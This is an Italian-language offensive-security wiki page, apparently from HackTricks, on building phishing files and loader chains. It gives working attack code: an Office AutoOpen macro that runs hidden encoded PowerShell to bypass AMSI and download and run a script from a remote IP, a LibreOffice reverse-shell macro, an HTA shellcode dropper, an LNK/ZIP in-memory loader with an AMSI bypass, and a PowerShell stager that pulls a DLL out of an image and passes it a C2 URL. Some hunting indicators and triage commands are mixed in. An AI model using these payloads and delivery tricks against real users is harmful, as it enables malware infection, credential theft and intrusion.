# File e documenti di phishing

{{#include ../../banners/hacktricks-training.md}}

## Documenti Office

Microsoft Word esegue la convalida dei dati del file prima di aprirlo. La convalida viene effettuata identificando la struttura dei dati in base allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file analizzato non verrà aperto.

Di solito, i file Word che contengono macro usano l'estensione `.docm`. Tuttavia, è possibile rinominare il file cambiandone l'estensione e mantenere comunque la possibilità di eseguire le macro.\
Ad esempio, un file RTF non supporta le macro per progettazione, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word e potrà eseguire macro.\
Gli stessi meccanismi interni si applicano a tutti i programmi della suite Microsoft Office (Excel, PowerPoint ecc.).

Puoi usare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:

```bash
assoc | findstr /i "word excel powerp"
```

I file DOCX che fanno riferimento a un template remoto (File –Options –Add-ins –Manage: Templates –Go) che include macro possono anche “eseguire” macro.

### Caricamento di immagini esterne

Vai a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Documenti Office - Caricamento di immagini esterne: vai a: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Per analizzare un documento ricevuto invece di crearne uno, vedi [Analisi delle macro VBA: codice spazzatura e UserForm](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Backdoor con macro

È possibile usare le macro per eseguire codice arbitrario dal documento.

#### Funzioni di caricamento automatico

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di codice delle macro

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Rimuovere manualmente i metadati

Vai a **File > Info > Inspect Document > Inspect Document** per aprire Document Inspector. Fai clic su **Inspect** e poi su **Remove All** accanto a **Document Properties and Personal Information**.

#### Estensione dei documenti

Al termine, seleziona il menu a discesa **Save as type** e cambia il formato da **`.docx`** a Word 97-2003 **`.doc`**.\
Fallo perché **non puoi salvare macro in un file `.docx`** e c'è uno **stigma** **legato** all'estensione **`.docm`**, che supporta le macro (ad esempio, l'icona della miniatura ha un enorme `!` e alcuni gateway web/email li bloccano del tutto). Pertanto, la **vecchia estensione `.doc` è il miglior compromesso**.

#### Generatori di macro malevole

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro auto-eseguibili (Basic) in LibreOffice ODT

I documenti di LibreOffice Writer possono incorporare macro Basic ed eseguirle automaticamente all'apertura del file, associando la macro all'evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Una semplice macro reverse shell è simile a questa:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Nota le virgolette doppie (`""`) all'interno della stringa: LibreOffice Basic le usa per rappresentare virgolette letterali, quindi i payload che terminano con `...==""")` mantengono bilanciati sia il comando interno sia l'argomento di Shell.

Consigli per la consegna:

- Salva come `.odt` e associa la macro all'evento del documento, in modo che venga eseguita immediatamente all'apertura.
- Quando invii email con `swaks`, usa `--attach @resume.odt` (`@` è necessario affinché venga inviato il contenuto del file, non la stringa del nome del file, come allegato). Questo è fondamentale quando si abusano server SMTP che accettano destinatari `RCPT TO` arbitrari senza convalida.

## File HTA

Un HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente e viene eseguito come applicazione "completamente attendibile", senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito usando **`mshta.exe`**, che in genere è **installato** insieme a **Internet Explorer**, quindi `mshta` dipende da IE. Se IE è stato disinstallato, gli HTA non potranno essere eseguiti.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Schede di allegati false nelle email HTML

Un'email HTML può imitare la scheda di anteprima degli allegati nativa di un provider senza contenere un vero allegato. Talos ha osservato una scheda Gmail ricreata usando quattro parti MIME PNG inline codificate in Base64. L'intero elemento visivo era racchiuso in un unico anchor e un valore del destinatario in `?m=<target-id>` abilitava il tracking per destinatario. Il link iniziava con `//` invece che con `http://` o `https://`: i browser risolvono questa forma protocol-relative, ma gli estrattori di URL che individuano solo URL completi potrebbero non rilevarla.<sup>[[11]](#references)</sup>

Durante l'analisi, esamina il MIME grezzo invece di fidarti dell'elenco degli allegati visualizzato. Ricostruisci come le parti immagine inline compongono la scheda visiva, individua l'anchor che la racchiude e normalizza i valori `href` protocol-relative prima di estrarre gli URL.<sup>[[11]](#references)</sup>

Per i test di spoofing del mittente dell'envelope/header e di allineamento DMARC, vedi [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Forzare l'autenticazione NTLM

Esistono diversi modi per **forzare l'autenticazione NTLM "da remoto"**. Per esempio, si possono aggiungere **immagini invisibili** alle email o all'HTML che l'utente visiterà (anche tramite HTTP MitM?). Oppure si può inviare alla vittima l'**indirizzo di file** che **attiveranno** un'**autenticazione** semplicemente **aprendo la cartella**.

**Verifica queste idee e altre ancora nelle pagine seguenti:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi solo rubare l'hash o l'autenticazione, ma anche **eseguire attacchi NTLM relay**:

- [**Attacchi NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay verso i certificati)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (catena fileless)

Campagne molto efficaci distribuiscono uno ZIP contenente due documenti-esca legittimi (PDF/DOCX) e un file .lnk malevolo. Il trucco è che il loader PowerShell effettivo è memorizzato nei byte grezzi dello ZIP, dopo un marker univoco, e il file .lnk lo estrae e lo esegue interamente in memoria.<sup>[[2]](#references)</sup>

Flusso tipico implementato dalla one-liner PowerShell del file .lnk:

1) Individuare lo ZIP originale nei percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e la cartella superiore della directory di lavoro corrente.
2) Leggere i byte dello ZIP e trovare un marker hardcoded (ad esempio, xFIQCV). Tutto ciò che segue il marker è il payload PowerShell incorporato.
3) Copiare lo ZIP in %ProgramData%, estrarlo lì e aprire il file .docx-esca per sembrare legittimi.
4) Bypassare AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deoffuscare lo stage successivo (ad esempio, rimuovendo tutti i caratteri #) ed eseguirlo in memoria.

Esempio di scheletro PowerShell per estrarre ed eseguire lo stage incorporato:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Note
- La delivery spesso sfrutta sottodomini PaaS affidabili (es. *.herokuapp.com) e può filtrare i payload (servendo ZIP innocui in base a IP/UA).
- La fase successiva spesso decritta shellcode base64/XOR e lo esegue tramite Reflection.Emit + VirtualAlloc per ridurre al minimo gli artefatti su disco.

Persistenza usata nella stessa catena
- Hijacking della COM TypeLib del controllo Microsoft Web Browser, in modo che IE/Explorer o qualsiasi app che lo incorpora rilanci automaticamente il payload.<sup>[[2]](#references)[[4]](#references)</sup> Vedi i dettagli e i comandi pronti all'uso qui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOC
- File ZIP contenenti la stringa marker ASCII (es. xFIQCV) aggiunta ai dati dell'archivio.
- File .lnk che enumerano le cartelle parent/utente per individuare lo ZIP e aprono un documento esca.
- Manomissione di AMSI tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread di conversazioni aziendali di lunga durata che terminano con link ospitati su domini PaaS affidabili.

## LNK con esca aperta per prima → persistenza tramite attività pianificata → side-loading di CPL affidabile

Un altro schema ricorrente è un **`.lnk` che si spaccia per un documento** e apre subito un'esca innocua, mentre prepara la vera catena in background.<sup>[[3]](#references)</sup>

Flusso osservato:
1. Il collegamento **si maschera da PDF** e usa `conhost.exe` o un proxy simile per avviare un downloader PowerShell offuscato.
2. PowerShell frammenta token evidenti (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) così che i rilevamenti ingenui che cercano `iwr`, `gci`, `ren`, `cpi` o `schtasks` non individuino il comando.
3. Lo stager scarica **prima il documento esca**, lo apre per la vittima e poi ricostruisce i file malevoli in background.
4. I payload possono essere scritti con **estensioni spazzatura** e poi rinominati rimuovendo i caratteri riempitivi, ritardando la comparsa di artefatti `.exe` / `.cpl` evidenti.
5. La persistenza viene stabilita con un'**attività pianificata con frequenza al minuto** che avvia un binario host affidabile da un percorso scrivibile dall'utente.

Indizi minimi per il hunting in questo schema:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Un layout di staging utile da riconoscere è:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Perché la seconda fase è furtiva

Nel case study di Rapid7, l'attività pianificata avviava ripetutamente **`Fondue.exe`** da `C:\Users\Public\`. Poiché **`APPWIZ.cpl`** era stato predisposto accanto a esso ed esportava **`RunFODW`**, il binario Microsoft attendibile caricava lateralmente il CPL dell'attaccante invece della copia di sistema legittima.

Il CPL:
- Legge un blob **AES-256-CBC** da `C:\Windows\Tasks\editor.dat`
- Lo decritta tramite **Windows CNG / `bcrypt.dll`**
- Alloca memoria eseguibile e vi copia lo shellcode decrittato
- Lo esegue indirettamente passando il puntatore allo shellcode come callback per **`EnumUILanguagesW`**

Vale la pena cercare separatamente quest'ultimo passaggio: spesso il malware evita un salto diretto `((void(*)())buf)()` e sfrutta invece una **WinAPI legittima che accetta una callback** per trasferire l'esecuzione.

Il payload decrittato in questa campagna era shellcode **Donut**, che ha poi mappato la PE finale interamente in memoria e applicato patch a **AMSI/WLDP/ETW** nel processo corrente prima di cedere l'esecuzione. Per approfondire il side-loading e l'elaborazione post-esecuzione residente in memoria, vedere:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Indicatori pratici da cercare:
- Un `.lnk` che avvia `powershell.exe` o `conhost.exe`, seguito da un documento-esca visibile.
- Download di breve durata in **`C:\Users\Public\`**, seguiti dalla ridenominazione immediata di file con estensioni senza senso.
- Attività pianificate con nomi anonimi come `GoogleErrorReport` che eseguono file da **directory scrivibili dall'utente**.
- Binari attendibili che caricano file **`.cpl` / `.dll`** dalla stessa directory non di sistema.
- Blob di testo Base64 scritti in **`C:\Windows\Tasks\`** e poi letti dal modulo caricato lateralmente.

## Payload delimitati tramite steganografia nelle immagini (stager PowerShell)

Le catene di loader recenti distribuiscono un JavaScript/VBS offuscato che decodifica ed esegue uno stager PowerShell Base64. Lo stager scarica un'immagine (spesso GIF) che contiene una DLL .NET codificata in Base64 e nascosta come testo semplice tra marcatori univoci di inizio e fine. Lo script cerca questi delimitatori (esempi osservati in natura: «<<sudo_png>> … <<sudo_odt>>>»), estrae il testo compreso tra essi, lo decodifica da Base64 in byte, carica l'assembly in memoria e invoca un metodo di ingresso noto fornendogli l'URL C2.<sup>[[5]](#references)</sup>

Flusso operativo
- Fase 1: Dropper JS/VBS archiviato → decodifica il Base64 incorporato → avvia lo stager PowerShell con -nop -w hidden -ep bypass.
- Fase 2: Lo stager PowerShell → scarica l'immagine, estrae il Base64 delimitato dai marcatori, carica la DLL .NET in memoria e ne chiama il metodo (ad es., VAI) passando l'URL C2 e le opzioni.
- Fase 3: Il loader recupera il payload finale e in genere lo inietta tramite process hollowing in un binario attendibile (comunemente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Per saperne di più sul process hollowing e sull'esecuzione proxy tramite utility attendibili, vedere:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Esempio PowerShell per estrarre una DLL da un'immagine e invocare in memoria un metodo .NET:

<details>
<summary>Estrattore di payload steganografico e loader PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Note
- Questo è ATT&CK T1027.003 (steganografia/nascondimento di marker).<sup>[[6]](#references)</sup> I marker variano da una campagna all’altra.
- L’AMSI/ETW bypass e la deoffuscazione delle stringhe vengono comunemente applicati prima di caricare l’assembly.
- Rilevamento: scansionare le immagini scaricate alla ricerca di delimitatori noti; individuare PowerShell che accede alle immagini e decodifica immediatamente blob Base64.

Vedi anche gli strumenti stego e le tecniche di carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging PowerShell Base64

Una fase iniziale ricorrente consiste in un file `.js` o `.vbs` piccolo e pesantemente offuscato, distribuito all’interno di un archivio. Il suo unico scopo è decodificare una stringa Base64 incorporata e avviare PowerShell con `-nop -w hidden -ep bypass` per predisporre la fase successiva tramite HTTPS.<sup>[[5]](#references)</sup>

Logica schematica (astratta):
- Leggere il contenuto del proprio file
- Individuare un blob Base64 tra stringhe di riempimento
- Decodificarlo in PowerShell ASCII
- Eseguirlo con `wscript.exe`/`cscript.exe` che avviano `powershell.exe`

Indicatori per il rilevamento
- Allegati JS/VBS archiviati che avviano `powershell.exe` con `-enc`/`FromBase64String` nella riga di comando.
- `wscript.exe` che avvia `powershell.exe -nop -w hidden` da percorsi temporanei dell’utente.

## Documenti MSC come contenitori di esecuzione (GrimResource)

I file Microsoft Management Console (`.msc`) sono definizioni di console XML normalmente aperte da `mmc.exe`. **GrimResource** sfrutta un riferimento `StringTable` a una risorsa `apds.dll` contenente una vecchia primitiva XSS, facendo sì che l’apertura della console appositamente creata da parte di un utente esegua JavaScript all’interno di `mmc.exe`. I campioni osservati combinavano l’offuscamento basato su `transformNode` con **DotNetToJScript** per istanziare un payload .NET senza ricorrere al consueto percorso delle macro di Office.<sup>[[9]](#references)</sup>

Per il triage statico, tratta un MSC non attendibile come testo e **non** farci doppio clic:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Le attività runtime ad alto segnale includono `mmc.exe` che carica il CLR o componenti script, crea connessioni di rete oppure avvia `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` o un eseguibile inatteso. Il formato è legittimo, quindi i rilevamenti dovrebbero correlare **origine + contenuto XML/script sospetto + comportamento di `mmc.exe`** invece di bloccare tutti gli MSC.<sup>[[9]](#references)</sup>

## Reindirizzatori PDF/QR e gating del payload

Un PDF non ha bisogno di un exploit per essere utile. Campagne recenti inseriscono un **codice QR o un normale link** in un documento dall’aspetto innocuo, spostano la sessione del browser fuori dai controlli della posta e personalizzano la destinazione usando l’indirizzo del destinatario. Microsoft ha documentato PDF del 2025 con URL QR univoci per destinatario, che portavano a infrastrutture RaccoonO365 per la raccolta di credenziali; una catena parallela usava il gating basato su IP/ambiente per restituire un percorso JavaScript/MSI ad alcuni visitatori, ma un PDF innocuo agli scanner o ai client non consentiti.<sup>[[10]](#references)</sup>

Esamina sia le azioni PDF sia i codici QR visualizzati. Un QR può essere disegnato come vettore anziché essere memorizzato come immagine estraibile, quindi rasterizza ogni pagina oltre a estrarre le immagini incorporate:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Esamina le destinazioni decodificate e i reindirizzamenti da un sistema di analisi isolato, senza autenticarti. Tra le funzionalità utili da rilevare ci sono PDF con solo QR code e messaggi email quasi vuoti, l’indirizzo email del destinatario incorporato in un parametro di query, diversi reindirizzamenti tramite servizi di hosting affidabili e contenuti diversi in base all’IP, alla geolocalizzazione, ai cookie, al referrer o allo user agent. Confronta le richieste usando profili controllati, perché una singola richiesta dal sandbox potrebbe ricevere solo il contenuto esca.<sup>[[10]](#references)</sup>

## File Windows per rubare hash NTLM

Consulta la pagina sui **luoghi in cui rubare credenziali NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro di LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagna ZipLine: un sofisticato attacco di phishing rivolto alle aziende statunitensi](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: tracciamento delle tecniche di Dropping Elephant attraverso una catena di loader a tema cinese](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nuova tecnica di persistenza COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Il loader PhantomVAI distribuisce una serie di infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Esecuzione tramite proxy di utility di sviluppo attendibili: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console per l’accesso iniziale e l’evasione](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Gli attori delle minacce sfruttano la stagione fiscale per diffondere campagne di phishing a tema fiscale](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Catena di distribuzione UAT-11587 e backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
